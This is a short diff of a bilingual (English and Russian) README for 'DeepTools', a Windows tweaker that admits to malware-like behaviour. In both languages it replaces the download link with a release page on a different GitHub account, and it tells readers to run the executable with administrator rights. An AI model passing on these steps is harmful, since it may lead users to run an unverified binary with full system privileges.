@@ -60,7 +60,7 @@ DeepTools is a system tweaker, so it does things real malware also does: elevate
 
 ### Installation
 
-1. Go to the [Releases](https://github.com/dep1xar/depixclicker/releases) page.
+1. Go to the [Releases](https://github.com/squadbustersfigna-ship-it/DeepTools/releases) page.
 2. Download the latest `DeepTools.exe`.
 3. Run it. Approve the UAC prompt when Windows asks for administrator rights.
 
@@ -133,7 +133,7 @@ DeepTools — системный твикер, поэтому он делает 
 
 ### Установка
 
-1. Открой страницу [Releases](https://github.com/dep1xar/depixclicker/releases).
+1. Открой страницу [Releases](https://github.com/squadbustersfigna-ship-it/DeepTools/releases).
 2. Скачай свежий `DeepTools.exe`.
 3. Запусти. Подтверди запрос UAC, когда Windows попросит права администратора.
 
